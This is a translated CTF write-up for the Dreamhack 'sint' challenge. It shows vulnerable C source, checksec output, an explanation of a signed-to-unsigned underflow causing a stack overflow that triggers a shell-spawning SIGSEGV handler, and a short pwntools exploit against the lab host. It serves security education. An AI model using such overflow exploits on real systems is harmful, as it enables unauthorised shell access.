# dreamhack.io: sint

> Originally published on [Naver Blog](https://blog.naver.com/chaeeunhur630/224311793098). Translated and reformatted in English.

Let’s look at the protection technique and source code applied with checksec.

chaeeun@chaeeuns-MacBook-Air fd7baa65-acbc-4b43-a9d0-b8bfd51cdae5 % ls 
sint sint.c
chaeeun@chaeeuns-MacBook-Air fd7baa65-acbc-4b43-a9d0-b8bfd51cdae5 % checksec ./sint
[*] '/Users/chaeeun/Desktop/fd7baa65-acbc-4b43-a9d0-b8bfd51cdae5/sint'
 Arch: i386-32-little
 RELRO: Partial RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: No PIE (0x8048000)
 Stripped: No
chaeeun@chaeeuns-MacBook-Air fd7baa65-acbc-4b43-a9d0-b8bfd51cdae5 % cat sint.c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
 puts("TIME OUT");
 exit(-1);
}

void initialize()
{
 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 signal(SIGALRM, alarm_handler);
 alarm(30);
}

void get_shell()
{
 system("/bin/sh");
}

int main()
{
 char buf[256];
 int size;

 initialize();

 signal(SIGSEGV, get_shell);

 printf("Size: ");
 scanf("%d", &size);

 if (size > 256 || size < 0)
 {
 printf("Buffer Overflow!\n");
 exit(0);
 }

 printf("Data: ");
 read(0, buf, size - 1);

 return 0;
}

You can see that ASLR and NX are applied in the lab environment. + partial relative. get shell seems to be the goal, and the core of the problem seems to be the integer underflow / signed-to-unsigned that occurs at size - 1.

This is the weak part.

read(0, buf, size - 1);

The test above is as follows.

if (size > 256 || size < 0)

So if size is negative or greater than 256, it blocks. But size = 0 passes. If you enter size = 0: size - 1 becomes 0 - 1 = -1.

However, the third argument of the read() function is of type size_t.

ssize_t read(int fd, void *buf, size_t count);

size_t is an unsigned integer type. Therefore, when -1 is converted to size_t, it becomes a very large value. Since it is a 32bit binary:

-1 → 0xffffffff

size is just a value that determines “how much can be read.” What actually destroys memory is the data input content. The program mistakenly believes that it can read up to 0xffffffff bytes of data because of the Size input. As a result, a stack buffer overflow occurs as read() attempts to write much more data than 256 bytes to buf. So how can you run bin shell with this? This code is very unique.

signal(SIGSEGV, get_shell); In other words, when a Segmentation Fault occurs in a program, it should die, but the get_shell() function is executed instead.

void get_shell()

{

system("/bin/sh");

}

Here is exploit.code.

from pwn import *

p = remote("host3.dreamhack.games", 22469)

p.sendlineafter(b"Size: ", b"0")
p.sendafter(b"Data: ", b"A" * 400) //Much larger than 256. 

p.interactive()
